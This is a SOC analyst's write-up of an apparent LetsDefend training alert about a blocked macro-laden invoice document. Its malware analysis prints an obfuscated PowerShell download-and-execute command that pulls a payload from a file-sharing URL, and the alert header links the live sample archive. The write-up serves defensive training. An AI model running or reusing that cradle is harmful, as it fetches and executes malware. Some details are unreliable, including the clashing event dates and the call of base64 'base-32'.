#  [001]- [Malicious File/Script Download Attempt Alert]

`EventID:76`<br>
`Event Time: Aug, 03, 2026, 04:15 PM`<br>
`Rule: SOC137 - Malicious File/Script Download Attempt`<br>
`Level: Security Analyst`<br>
`Source Address:172.16.17.37`<br>
`Source Hostname: NicolasPRD`<br>
`File Name: INVOICE PACKAGE LINK TO DOWNLOAD.docm`<br>
`File Hash:f2d0c66b801244c059f636d08a474079`<br>
`File Size:16.66 Kb`<br>
`Device Action: Blocked`<br>
`Download (Password: infected):https://files-ld.s3.us-east-2.amazonaws.com/f2d0c66b801244c059f636d08a474079.zip`<br>
`Severity assigned: Medium`

## Alert Summary
On 14 March 2021 at 07:15 PM, alert SOC137 - Malicious File/Script Download Attempt was triggered, indicating a potential malware-related activity. The alert is mapped to MITRE ATT&CK Technique *[T1204 (User Execution)](https://attack.mitre.org/techniques/T1204/)*, suggesting that a user may have executed or attempted to download a malicious file or script. As a security analyst, I would investigate the affected host, identify the source URL or IP address, review downloaded files, analyze process execution events, and determine whether the download was successful. Additional analysis would include checking endpoint logs, antivirus detections, and network traffic to assess the scope and impact of the activity. Given the Medium severity, the event requires validation to determine whether it represents a genuine compromise or a false positive.

## Objective
- Determine whether the file/script download was malicious,
- Identify the affected system and user,
- Assess any subsequent execution activity,
- and recommend containment or remediation actions if compromise is confirmed.<br><br>


<img width="823" height="350" alt="image" src="https://github.com/user-attachments/assets/46156a6d-2078-4e92-9a17-5807fc89a058" /><br>
*Fig 1*

<img width="823" height="350" alt="image" src="https://github.com/user-attachments/assets/8126e74c-cb68-48ea-a3ef-ca10f517cef3" /><br>
*Fig 2*
## Event Description

The event reported a blocked attempt to download a potentially malicious file named `INVOICE PACKAGE LINK TO DOWNLOAD.docm`, as shown in the images below. The images display the hashed file along with the device/host information and the assigned IP address. This crucial information necessitates further analysis to determine whether the file is indeed malicious and to implement any required protective measures.

<img width="823" height="200" alt="image" src="https://github.com/user-attachments/assets/f34fe10e-48b6-4265-a794-dfc705405dae" /><br>
*Fig 3*

<img width="823" height="200" alt="image" src="https://github.com/user-attachments/assets/1f70db7c-642e-45d3-b3c2-df3a69890bb2" /><br>
*Fig 4*<br>

I began by collecting information, including the hostname `NicolasPRD` and the IP address `172.16.17.37` of the device running on `Windows 10`. Once I discovered the host on the network, the first step was to quarantine the device by disconnecting it from the network, as shown in the image below. After that, I examined the processes, network activity, terminal History, and browser history to gather more information about the alerted malicious file.

<img width="823" height="300" alt="image" src="https://github.com/user-attachments/assets/6eef784e-7371-4343-8285-6b49c65130af" /><br>
*Fig 5*

## Terminal History

During the examination of the terminal, three malicious PowerShell commands were identified at different time intervals. These commands contained suspicious elements such as `Invoke-Expression (IEX)`,`powershell.exe`, `ExecutionPolicy Bypass`, `Window Hidden`, `NonInteractive`, `IEX`, `FromBase64String`, `DeflateStream`, and `[Convert]:: FromBase64String`, used to convert from a base-32 format. The presence of these indicators suggests that the payload is indeed malicious. Similar suspicious indicators were found in the other commands, but they were unrelated to the alerted malicious file.<br>

Analyzing each payload presented challenges, particularly in extracting the strings needed to understand potential execution outcomes. Additionally, there was no information on how the host obtained the malicious PowerShell commands and payloads. As mentioned earlier, the indicators in the command lines revealed the presence of an obfuscated PowerShell malware downloader and loader as seen in *Fig. 6 & 7*. 

<img width="823" height="350" alt="image" src="https://github.com/user-attachments/assets/7f6dd59a-a241-47d3-a97d-83936ac08bda" /><br>
*Fig 6*

<img width="823" height="350" alt="image" src="https://github.com/user-attachments/assets/27fcef12-d7d5-4967-b35b-d11f308549e9" /><br>
*Fig 7


## Examining the Processes and Network Action

Currently, there is no concrete information to clarify whether these represent active processes or a network connection, which leaves us with uncertainty, as seen in the images below.

<img width="823" height="300" alt="image" src="https://github.com/user-attachments/assets/012f107c-a098-4ed8-9713-b39fec1e66ca" /><br>
*Fig 8*

<img width="823" height="300" alt="image" src="https://github.com/user-attachments/assets/7186e686-7297-4be7-b704-5c9e15254d09" /><br>
*Fig 9*

## File Analysis

Examining the Malicious File: `INVOICE PACKAGE LINK TO DOWNLOAD.docm`, Hash: `f2d0c66b801244c059f636d08a474079`

The malicious document is said to be a **Macros** by Virustotal, which is used by malicious actors to deliver malware.

### Malware Analysis Results with VirusTotal 

There are three most important sections to perform the malware analysis on VirusTotal, which are Details, Relations, and Behaviours.

#### Relations

As shown in the images below, the relations provided URLs associated with the malicious file. Therefore, when the host executes the file, it directs the host to these links. **URL:** `https://filetransfer.io/data-package/UR2whuBv/download`, `	https://filetransfer.io/`.<br>

It also provides access to a few domains and connected IP addresses associated with the file, as seen in the image below.

#### Details

As shown in the images below, this provides essential properties of the file, including MD5, SHA-256, SHA-1, and more, to verify the malicious file.<br>
It also includes the file's history, specifying its creation date, first submission, last submission, and the last analysis conducted on this file. The Names section lists additional names linked to the file, each referencing the malicious file.

#### Behaviours

This section contains detailed information about the malicious file, including a step-by-step technique devised by the threat actor. It also outlines MITRE ATT&CK Tactics and Techniques, behavior tags, network communications, and more. However, my main focus will be on the effects of executing this file on the system.<br>
It is believed that either the *user* or a *process* made a `GET` request to `https://filetransfer.io/`, which redirected to the link `https://filetransfer.io/data-package/UR2whuBv/download`. However, this request was **blocked**. If it had been executed, it could have modified the file system and the file registry by running an unrecognized or potentially malicious process, as seen in the image below from Virustotal. 

As shown in Figure 11, running the file establishes a path to PowerShell.exe to execute a NET.WebClient. `````path: \\?\C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, commandline: powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).`````<br><br>

The purpose of that was to invoke a malicious link `'https://filetransfer.io/data-package/UR2whuBv/download'` to download the malicious file. <br><br><br>

`(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))`<br>

This section appears to utilize a method referred to as “string obfuscation.” The main objective of employing this technique is to complicate the code and make it less recognizable to static analysis tools. These tools are often used in cybersecurity to scan code for vulnerabilities or malicious patterns, using signature-based detection methods that look for known harmful behaviors or sequences of code. By obscuring the strings within the code, the method aims to prevent these analysis tools from easily identifying the underlying functionality or intentions of the code. This adds a layer of protection against potential attackers who rely on such tools for reconnaissance and exploitation of vulnerabilities. [Enes Adışen](https://medium.com/@zapbroob9/soc137-eventid-76-malicious-file-script-download-attempt-letsdefend-io-277090f3dd4b)

<img width="920" height="428" alt="image" src="https://github.com/user-attachments/assets/8bf4031c-c970-4506-934d-58483480436c" /><br>
*Fig 10*

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/81bddb52-3533-42bd-9570-6256b7d01b1f" /><br>
*Fig 11*

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/d56f72ba-b9bb-44b2-ae39-20ee9b31d79f" /><br>
*Fig 12*

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/18b31608-8851-48ea-8293-82be4d0b8493" /><br>
*Fig 13*

### MITRE ATT&CK Tactics and Techniques

This lists and explains what the file contains after an analysis was performed on the file by virustoal. listed tactics and techniques mentioned include:<br>
- Process Injection
- Remote system discovery
- Temp Injection <br>

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/a60cf25c-d39e-4031-91b4-bfe88e4bc8b4" /><br>
*Fig 14*

## Creating Case for Event ID: 76

### Playbook Answers
Select Threat Indicator?

- Answer: Other

Malware quarantined/cleaned?

- Answer: I've realized that "not quarantined" isn't the right response, despite my belief that a block doesn't automatically imply quarantine. However, since LetsDefend interprets it that way, we should accept that the correct answer is "quarantined."

Analyse Malware?

- Answer: Malicious.

Check If Someone Requested the C2

- Answer: I found no indications that the C2 has been accessed.<br><br>

I can confidently close the case, recognizing it as a **True positive**.

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/cfd0dc94-b61c-42e8-8cdd-aa14b4484486" /><br>
*Fig 15*

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/f10cda6c-17b8-4cb9-b90b-a49fa9413918" /><br>
*Fig 16*

<img width="800" height="350" alt="image" src="https://github.com/user-attachments/assets/cff15b9f-806e-4e7a-a2b4-a5ee375e755d" /><br>
*Fig 17*

#
